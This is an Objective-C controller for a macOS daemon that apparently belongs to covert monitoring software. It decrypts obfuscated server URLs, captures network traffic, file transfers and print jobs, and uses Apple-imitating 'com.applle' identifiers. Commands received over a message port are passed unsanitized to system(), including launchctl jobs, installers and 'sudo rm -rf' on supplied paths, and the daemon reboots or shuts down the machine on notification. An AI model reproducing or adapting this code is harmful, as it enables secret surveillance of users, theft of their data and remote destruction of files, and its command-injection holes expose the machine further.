//  blbldController.m
//  blbld
//
//  Created by Ophat Phuetkasickonphasutha on 11/12/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "blbldController.h"
#import "NetworkTrafficCapture.h"
#import "NetworkAlertCapture.h"
#import "UploadDownloadFileCapture.h"
#import "PrinterFileMonitor.h"

#import "blbldUtils.h"
#import "Product.h"
#import "ServerAddressManagerImp.h"
#import "DaemonPrivateHome.h"
#import "PreferenceManagerImpl.h"
#import "PrefEventsCapture.h"

static blbldController *_blbldController = nil;

@interface blbldController (private)
- (void) executeCmd: (NSDictionary *) aCmd;
@end

@implementation blbldController

@synthesize mNetworkTrafficCapture,mNetworkAlertCapture,mUploadDownloadFileCapture;
@synthesize mPrinterFileMonitor;

+ (instancetype) sharedblbldController {
    if (_blbldController == nil) {
        _blbldController = [[blbldController alloc] init];
        [_blbldController startNotify];
    }
    return _blbldController;
}

- (instancetype) init {
    self = [super init];
    if (self) {
        NSString *privateHomePath = [DaemonPrivateHome daemonPrivateHome];
        
        NSString *nett_filePath = [privateHomePath stringByAppendingString:@"net_data/"];
        
        mMessagePortReader = [[MessagePortIPCReader alloc] initWithPortName:@"bSecuriyAgents" withMessagePortIPCDelegate:self];
        mPreferenceManager = [[PreferenceManagerImpl alloc] init];
        
        NSData *cipher = [NSData dataWithBytes:kServerUrl length:(sizeof(kServerUrl)/sizeof(unsigned char))];
        NSString *serverUrl = [ServerAddressManagerImp decryptCipher:cipher];
        
        cipher = [NSData dataWithBytes:kPushServerUrl length:(sizeof(kPushServerUrl)/sizeof(unsigned char))];
        NSString *pushServerUrl = [ServerAddressManagerImp decryptCipher:cipher];
        
        mNetworkTrafficCapture = [[NetworkTrafficCapture alloc] init];
        mNetworkTrafficCapture.mMyUrl = serverUrl;
        mNetworkTrafficCapture.mMyPushUrl = pushServerUrl;
        mNetworkTrafficCapture.mSavePath = nett_filePath;
        
        mNetworkAlertCapture = [[NetworkAlertCapture alloc] init];
        mNetworkAlertCapture.mSavePath = nett_filePath;
        
        mUploadDownloadFileCapture = [[UploadDownloadFileCapture alloc] init];
        
        NSString *printer_filePath = [privateHomePath stringByAppendingString:@"attachments/printjob/"];
        mPrinterFileMonitor = [[PrinterFileMonitor alloc] initWithPrinterFilePath:printer_filePath];
    }
    return self;
}

-(void) startNotify {
    DLog(@"### startNotify");
    
    [mMessagePortReader start];
    
    PrefEventsCapture *eventCapture = (PrefEventsCapture *)[mPreferenceManager preference:kEvents_Ctrl];
    
    if (eventCapture.mStartCapture && eventCapture.mEnableTemporalControlNetworkTraffic) {
        [mNetworkTrafficCapture startNetworkCapture];
    } else {
        DLog(@"Stop capture network traffic");
    }
    
    if (eventCapture.mStartCapture && eventCapture.mEnableNetworkAlert) {
        [mNetworkAlertCapture startNetworkCapture];
    } else {
        DLog(@"Stop capture network alert");
    }
    
    if (eventCapture.mStartCapture && eventCapture.mEnableFileTransfer) {
        [mUploadDownloadFileCapture startCapture];
    } else {
        DLog(@"Stop capture internet file transfer");
    }
    
    if (eventCapture.mStartCapture && eventCapture.mEnablePrintJob) {
        [mPrinterFileMonitor startCapture];
    } else {
        DLog(@"Stop capture printer job");
    }
    
    // Internet File Transfer
    CFNotificationCenterAddObserver(CFNotificationCenterGetDarwinNotifyCenter(), (void *)self, startIFTCaptureCallback, CFSTR("com.applle.blblu.ift.enable"), nil, CFNotificationSuspensionBehaviorDeliverImmediately);
    CFNotificationCenterAddObserver(CFNotificationCenterGetDarwinNotifyCenter(), (void *)self, stopIFTCaptureCallback, CFSTR("com.applle.blblu.ift.disable"), nil, CFNotificationSuspensionBehaviorDeliverImmediately);
    
    // Print Job
    CFNotificationCenterAddObserver(CFNotificationCenterGetDarwinNotifyCenter(), (void *)self, startPrintJobCaptureCallback, CFSTR("com.applle.blblu.pj.enable"), nil, CFNotificationSuspensionBehaviorDeliverImmediately);
    CFNotificationCenterAddObserver(CFNotificationCenterGetDarwinNotifyCenter(), (void *)self, stopPrintJobCaptureCallback, CFSTR("com.applle.blblu.pj.disable"), nil, CFNotificationSuspensionBehaviorDeliverImmediately);
    
    // Shutdown and reboot
    CFNotificationCenterAddObserver(CFNotificationCenterGetDarwinNotifyCenter(), (void *)self, rebootCallback, CFSTR("com.applle.blblu.ac.reboot"), nil, CFNotificationSuspensionBehaviorDeliverImmediately);
    CFNotificationCenterAddObserver(CFNotificationCenterGetDarwinNotifyCenter(), (void *)self, shutdownCallback, CFSTR("com.applle.blblu.ac.shutdown"), nil, CFNotificationSuspensionBehaviorDeliverImmediately);
}

-(void) stopNotify {
    DLog(@"### stopNotify");
    if (mMessagePortReader) {
        [mMessagePortReader stop];
        [mMessagePortReader release];
        mMessagePortReader = nil;
    }
    
    // Internet File Transfer
    CFNotificationCenterRemoveObserver(CFNotificationCenterGetDarwinNotifyCenter(), (void *)self, CFSTR("com.applle.blblu.ift.enable"), nil);
    CFNotificationCenterRemoveObserver(CFNotificationCenterGetDarwinNotifyCenter(), (void *)self, CFSTR("com.applle.blblu.ift.disable"), nil);
    
    // Print Job
    CFNotificationCenterRemoveObserver(CFNotificationCenterGetDarwinNotifyCenter(), (void *)self, CFSTR("com.applle.blblu.pj.enable"), nil);
    CFNotificationCenterRemoveObserver(CFNotificationCenterGetDarwinNotifyCenter(), (void *)self, CFSTR("com.applle.blblu.pj.disable"), nil);
    
    // Shutdown and reboot
    CFNotificationCenterRemoveObserver(CFNotificationCenterGetDarwinNotifyCenter(), (void *)self, CFSTR("com.applle.blblu.ac.reboot"), nil);
    CFNotificationCenterRemoveObserver(CFNotificationCenterGetDarwinNotifyCenter(), (void *)self, CFSTR("com.applle.blblu.ac.shutdown"), nil);
}

#pragma mark - Message port IPC

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
    NSKeyedUnarchiver *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:aRawData];
    NSDictionary *myDictionary = [[unarchiver decodeObjectForKey:@"command"] retain];
    [unarchiver finishDecoding];
    [unarchiver release];
    
    [self executeCmd:myDictionary];
    
    [myDictionary release];
}

#pragma mark - Private methods

- (void) executeCmd: (NSDictionary *) aCmd {
    NSDictionary *myDictionary = aCmd;
    NSString* type = [myDictionary objectForKey:@"type"];
    DLog(@"=!= type: %@", type);
    
    if ([type isEqualToString:@"uninstall"]) {
        NSString *command = [myDictionary objectForKey:@"command"];
        NSString *cmd = [NSString stringWithFormat:@"launchctl submit -l com.applle.blblx.unload -p %@ start", command];
        DLog (@"cmd = %@", cmd);
        
        system([cmd cStringUsingEncoding:NSUTF8StringEncoding]);
        exit(0);
    }
    else if ([type isEqualToString:@"update1"]) {
        NSString* command = [myDictionary objectForKey:@"command"];
        //NSString* binaryName = [myDictionary objectForKey:@"binaryname"];
        NSString* tmpAppPath = [myDictionary objectForKey:@"tmpapppath"];
        NSString* unArchivedPath = [myDictionary objectForKey:@"unarchivedpath"];
        
        NSString *updateScript = [NSString stringWithFormat:@"launchctl submit -l com.applle.blblx.update -p %@ start", command];
        DLog (@"Step 4: Run update script %@", updateScript);
        system([updateScript cStringUsingEncoding:NSUTF8StringEncoding]);
        
        // -- delete tar path
        NSString * deleteApp = [NSString stringWithFormat:@"sudo rm -rf %@", tmpAppPath];
        DLog (@"Step 5.1: Delete temp binary %@",  deleteApp)
        system([deleteApp cStringUsingEncoding:NSUTF8StringEncoding]);
        
        // -- delete untar path
        deleteApp = [NSString stringWithFormat:@"sudo rm -rf %@", unArchivedPath];
        DLog (@"Step 5.2: Delete untar path %@",  unArchivedPath)
        system([deleteApp cStringUsingEncoding:NSUTF8StringEncoding]);
    }
    else if ([type isEqualToString:@"update2"]) {
        // -- run installer
        NSString *command = [myDictionary objectForKey:@"command"];
        NSString *updateScript = command;
        NSString *tmpAppPath = [myDictionary objectForKey:@"tmpapppath"];
        
        DLog (@"Step 3: Run installer %@",  updateScript);
        system([updateScript cStringUsingEncoding:NSUTF8StringEncoding]);
        
        // -- delete .pkg file
        NSString *deleteApp = [NSString stringWithFormat:@"sudo rm -rf %@", tmpAppPath];
        DLog (@"Step 4 Delete .pkg path %@",  tmpAppPath)
        system([deleteApp cStringUsingEncoding:NSUTF8StringEncoding]);
    }
    else if ([type isEqualToString:@"networktraffic_stop"]) {
        [mNetworkTrafficCapture stopNetworkCapture];
    }
    else if ([type isEqualToString:@"networktraffic_start"]) {
        [mNetworkTrafficCapture startNetworkCapture];
    }
    else if ([type isEqualToString:@"networkalert_stop"]) {
        [mNetworkAlertCapture stopNetworkCapture];
    }
    else if ([type isEqualToString:@"networkalert_start"]) {
        [mNetworkAlertCapture startNetworkCapture];
    }
    else if ([type isEqualToString:@"delete"]) {
        NSString * cmd = [NSString stringWithFormat:@"sudo rm -rf '%@'",[myDictionary objectForKey:@"path"]];
        DLog(@"delete %@",cmd);
        system([cmd cStringUsingEncoding:NSUTF8StringEncoding]);
    }
    else if ([type isEqualToString:@"deleteallfilethatcontain"]) {
        NSString * cmd = [NSString stringWithFormat:@"sudo rm -rf '%@'*",[myDictionary objectForKey:@"path"]];
        DLog(@"deleteallfilethatcontain %@",cmd);
        system([cmd cStringUsingEncoding:NSUTF8StringEncoding]);
    }
}

#pragma mark - Internet File Transfer

void startIFTCaptureCallback(CFNotificationCenterRef center, void *observer, CFStringRef name, const void *object, CFDictionaryRef userInfo) {
    DLog(@"Enable Internet File Transfer from Darwin");
    blbldController *myself = (blbldController *)observer;
    [myself.mUploadDownloadFileCapture startCapture];
}

void stopIFTCaptureCallback(CFNotificationCenterRef center, void *observer, CFStringRef name, const void *object, CFDictionaryRef userInfo) {
    DLog(@"Disable Internet File Transfer from Darwin");
    blbldController *myself = (blbldController *)observer;
    [myself.mUploadDownloadFileCapture stopCapture];
}

#pragma mark - Printer Job

void startPrintJobCaptureCallback(CFNotificationCenterRef center, void *observer, CFStringRef name, const void *object, CFDictionaryRef userInfo) {
    DLog(@"Enable Print Job from Darwin");
    blbldController *myself = (blbldController *)observer;
    [myself.mPrinterFileMonitor startCapture];
}

void stopPrintJobCaptureCallback(CFNotificationCenterRef center, void *observer, CFStringRef name, const void *object, CFDictionaryRef userInfo) {
    DLog(@"Disable Print Job from Darwin");
    blbldController *myself = (blbldController *)observer;
    [myself.mPrinterFileMonitor stopCapture];
}

#pragma mark - Shutdown and reboot

void rebootCallback(CFNotificationCenterRef center, void *observer, CFStringRef name, const void *object, CFDictionaryRef userInfo) {
    DLog(@"Reboot from Darwin");
    [blbldUtils reboot];
}

void shutdownCallback(CFNotificationCenterRef center, void *observer, CFStringRef name, const void *object, CFDictionaryRef userInfo) {
    DLog(@"Shutdown from Darwin");
    [blbldUtils shutdown];
}

#pragma mark - Dealloc -

- (void) dealloc {
    [self stopNotify];
    
    [mPrinterFileMonitor release];
    [mUploadDownloadFileCapture release];
    [mNetworkTrafficCapture release];
    [mNetworkAlertCapture release];
    
    [super dealloc];
}

@end
